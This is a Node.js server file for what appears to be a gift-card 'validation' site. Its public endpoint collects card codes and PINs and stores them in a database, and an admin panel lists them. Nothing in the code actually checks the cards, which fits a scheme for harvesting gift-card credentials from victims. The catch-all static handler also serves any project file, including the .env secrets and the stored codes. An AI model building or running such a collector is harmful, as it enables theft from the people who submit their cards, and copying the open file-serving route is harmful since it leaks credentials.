const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { DatabaseSync } = require('node:sqlite');

function loadEnvFile() {
  const envPath = path.join(__dirname, '.env');
  if (!fs.existsSync(envPath)) return;
  const content = fs.readFileSync(envPath, 'utf8');
  for (const line of content.split(/\r?\n/)) {
    const trimmed = line.trim();
    if (!trimmed || trimmed.startsWith('#') || !trimmed.includes('=')) continue;
    const [key, ...rest] = trimmed.split('=');
    const value = rest.join('=').trim();
    if (!process.env[key]) {
      process.env[key] = value.replace(/^['"]|['"]$/g, '');
    }
  }
}

loadEnvFile();

const port = Number(process.env.PORT) || 3000;
const rootDir = __dirname;
const dataDir = path.join(rootDir, 'data');
const dbType = process.env.DB_TYPE || 'sqlite';
const dbPath = process.env.DB_PATH || path.join(dataDir, 'requests.sqlite');
const adminUsername = process.env.ADMIN_USERNAME;
const adminPassword = process.env.ADMIN_PASSWORD;
const sessionSecret = process.env.SESSION_SECRET;
const sessions = new Map();

if (!fs.existsSync(dataDir)) {
  fs.mkdirSync(dataDir, { recursive: true });
}

if (!adminUsername || !adminPassword || !sessionSecret) {
  console.error('Missing required environment variables: ADMIN_USERNAME, ADMIN_PASSWORD, SESSION_SECRET');
  process.exit(1);
}

if (dbType !== 'sqlite') {
  console.error('Unsupported DB_TYPE. Only sqlite is supported in this deployment setup.');
  process.exit(1);
}

function createHash(value, salt) {
  return crypto.pbkdf2Sync(value, salt, 310000, 32, 'sha256').toString('hex');
}

function timingSafeEqual(a, b) {
  const aBuffer = Buffer.from(a, 'hex');
  const bBuffer = Buffer.from(b, 'hex');
  if (aBuffer.length !== bBuffer.length) return false;
  return crypto.timingSafeEqual(aBuffer, bBuffer);
}

function verifyAdminPassword(username, password) {
  if (username !== adminUsername) return false;
  if (!adminPassword) return false;
  const salt = process.env.ADMIN_PASSWORD_SALT || 'giftcard-admin-hash';
  const expectedHash = process.env.ADMIN_PASSWORD_HASH || createHash(adminPassword, salt);
  const suppliedHash = createHash(password, salt);
  return timingSafeEqual(suppliedHash, expectedHash);
}

function openDatabase() {
  const db = new DatabaseSync(dbPath);
  db.exec(`
    CREATE TABLE IF NOT EXISTS requests (
      id TEXT PRIMARY KEY,
      type TEXT NOT NULL,
      brand TEXT NOT NULL,
      payload TEXT NOT NULL,
      created_at TEXT NOT NULL
    )
  `);
  return db;
}

const db = openDatabase();

function sendJson(res, statusCode, payload, extraHeaders = {}) {
  res.writeHead(statusCode, {
    'Content-Type': 'application/json; charset=utf-8',
    'X-Content-Type-Options': 'nosniff',
    'X-Frame-Options': 'DENY',
    'Referrer-Policy': 'no-referrer',
    ...extraHeaders
  });
  res.end(JSON.stringify(payload));
}

function createSessionId() {
  const random = crypto.randomBytes(24).toString('hex');
  if (!sessionSecret) return random;
  return crypto.createHmac('sha256', sessionSecret).update(random).digest('hex');
}

function parseCookies(req) {
  const cookieHeader = req.headers.cookie || '';
  return cookieHeader.split(';').map((entry) => entry.trim()).filter(Boolean).reduce((acc, entry) => {
    const [key, ...rest] = entry.split('=');
    acc[key] = rest.join('=');
    return acc;
  }, {});
}

function getSession(req) {
  const cookies = parseCookies(req);
  const sessionId = cookies.admin_session;
  if (!sessionId) return null;
  return sessions.get(sessionId) || null;
}

function setSessionCookie(res, req, sessionId) {
  const isSecure = req.headers['x-forwarded-proto'] === 'https' || process.env.NODE_ENV === 'production';
  const secureFlag = isSecure ? '; Secure' : '';
  res.setHeader('Set-Cookie', [`admin_session=${sessionId}; HttpOnly; SameSite=Lax; Path=/; Max-Age=3600${secureFlag}`]);
}

function parseBody(req) {
  return new Promise((resolve, reject) => {
    let body = '';
    req.on('data', (chunk) => {
      body += chunk;
    });
    req.on('end', () => {
      if (!body) {
        resolve({});
        return;
      }
      try {
        resolve(JSON.parse(body));
      } catch (error) {
        reject(new Error('Invalid JSON body'));
      }
    });
    req.on('error', reject);
  });
}

function getContentType(filePath) {
  const ext = path.extname(filePath).toLowerCase();
  switch (ext) {
    case '.html': return 'text/html; charset=utf-8';
    case '.css': return 'text/css; charset=utf-8';
    case '.js': return 'application/javascript; charset=utf-8';
    case '.json': return 'application/json; charset=utf-8';
    case '.svg': return 'image/svg+xml';
    case '.png': return 'image/png';
    case '.jpg': case '.jpeg': return 'image/jpeg';
    case '.webp': return 'image/webp';
    default: return 'application/octet-stream';
  }
}

function serveStatic(req, res, filePath) {
  const fullPath = path.join(rootDir, filePath);
  fs.readFile(fullPath, (error, data) => {
    if (error) {
      sendJson(res, 404, { ok: false, error: 'Not found' });
      return;
    }
    res.writeHead(200, {
      'Content-Type': getContentType(fullPath),
      'Cache-Control': 'no-store',
      'X-Content-Type-Options': 'nosniff',
      'X-Frame-Options': 'DENY',
      'Referrer-Policy': 'same-origin',
      'Content-Security-Policy': "default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self' 'unsafe-inline'; img-src 'self' data: https:; connect-src 'self';"
    });
    res.end(data);
  });
}

function insertRequest(entry) {
  db.prepare('INSERT INTO requests (id, type, brand, payload, created_at) VALUES (?, ?, ?, ?, ?)').run(
    entry.id,
    entry.type,
    entry.brand,
    JSON.stringify(entry.payload),
    entry.createdAt
  );
}

function getRequests() {
  const rows = db.prepare('SELECT * FROM requests ORDER BY created_at DESC').all();
  const validations = [];
  const purchases = [];

  rows.forEach((row) => {
    const payload = JSON.parse(row.payload || '{}');
    const record = {
      id: row.id,
      type: row.type,
      brand: row.brand,
      createdAt: row.created_at,
      ...payload
    };
    if (row.type === 'validate') validations.push(record);
    if (row.type === 'purchase') purchases.push(record);
  });

  return { validations, purchases };
}

const server = http.createServer(async (req, res) => {
  const { method, url = '/' } = req;
  const pathname = new URL(url, `http://${req.headers.host || '127.0.0.1'}`).pathname;

  if (method === 'POST' && pathname === '/api/login') {
    try {
      const body = await parseBody(req);
      if (verifyAdminPassword(body.username || '', body.password || '')) {
        const sessionId = createSessionId();
        sessions.set(sessionId, { username: adminUsername, createdAt: Date.now() });
        setSessionCookie(res, req, sessionId);
        sendJson(res, 200, { ok: true, message: 'Authenticated' });
      } else {
        sendJson(res, 401, { ok: false, error: 'Invalid credentials' });
      }
    } catch (error) {
      sendJson(res, 400, { ok: false, error: error.message });
    }
    return;
  }

  if (method === 'POST' && pathname === '/api/validate') {
    try {
      const body = await parseBody(req);
      const entry = {
        id: Date.now().toString(36),
        type: 'validate',
        brand: body.brand || 'Gift',
        payload: {
          currency: body.currency || 'USD',
          amount: body.amount || '',
          code: body.code || '',
          pin: body.pin || '',
          status: body.status || 'Not Activated'
        },
        createdAt: new Date().toISOString()
      };
      insertRequest(entry);
      sendJson(res, 200, { ok: true, type: 'validate', entry });
    } catch (error) {
      sendJson(res, 400, { ok: false, error: error.message });
    }
    return;
  }

  if (method === 'POST' && pathname === '/api/purchase') {
    try {
      const body = await parseBody(req);
      const entry = {
        id: Date.now().toString(36),
        type: 'purchase',
        brand: body.brand || 'Gift',
        payload: {
          amount: body.amount || 0,
          quantity: body.quantity || 1,
          sendAsGift: Boolean(body.sendAsGift)
        },
        createdAt: new Date().toISOString()
      };
      insertRequest(entry);
      sendJson(res, 200, { ok: true, type: 'purchase', entry });
    } catch (error) {
      sendJson(res, 400, { ok: false, error: error.message });
    }
    return;
  }

  if (method === 'GET' && pathname === '/api/requests') {
    const session = getSession(req);
    if (!session) {
      sendJson(res, 401, { ok: false, error: 'Unauthorized' });
      return;
    }
    sendJson(res, 200, getRequests());
    return;
  }

  if (method === 'GET' && pathname === '/') {
    serveStatic(req, res, 'index.html');
    return;
  }

  if (method === 'GET' && pathname === '/admin') {
    const session = getSession(req);
    if (!session) {
      res.writeHead(302, { Location: '/login' });
      res.end();
      return;
    }
    serveStatic(req, res, 'admin.html');
    return;
  }

  if (method === 'GET' && pathname === '/login') {
    serveStatic(req, res, 'login.html');
    return;
  }

  if (method === 'GET' && pathname === '/health') {
    sendJson(res, 200, { ok: true, status: 'healthy' });
    return;
  }

  const requestPath = pathname === '/' ? 'index.html' : pathname.replace(/^\//, '');
  serveStatic(req, res, requestPath);
});

server.listen(port, () => {
  console.log(`Server running on http://127.0.0.1:${port}`);
});
